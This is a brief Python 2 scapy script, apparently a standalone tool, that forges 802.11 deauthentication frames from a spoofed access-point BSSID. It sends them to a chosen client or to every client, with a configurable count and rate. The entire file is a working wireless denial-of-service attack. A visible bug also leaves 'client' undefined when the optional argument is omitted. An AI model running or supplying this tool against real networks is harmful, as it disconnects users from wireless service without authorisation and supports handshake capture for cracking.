#!/usr/bin/python2.7

import sys
from scapy.all import *

conf.verb=0
brdcstMAC="ff:ff:ff:ff:ff:ff"

def sendDeauthPkts(iface, count=1, client=brdcstMAC, rate=0, bssid=RandMAC()):

	deauthPkt=RadioTap() / Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
	sendp(deauthPkt, iface=iface, count=count, inter=rate)


if __name__=="__main__":
	print "USAGE: ./deauth.py <iface> <pkt_count> <AP_BSSID_to_send_deauth_from> [<client_to_deauthenticate>] [<rate_of_death_packtes>] ...\n[] ---> OPTIONAL!\n"

	rate=0

	if len(sys.argv)>=5:
		client=sys.argv[4]
	if len(sys.argv)==6:
		rate=float(sys.argv[5])

	sendDeauthPkts(sys.argv[1], int(sys.argv[2]), client, rate, sys.argv[3])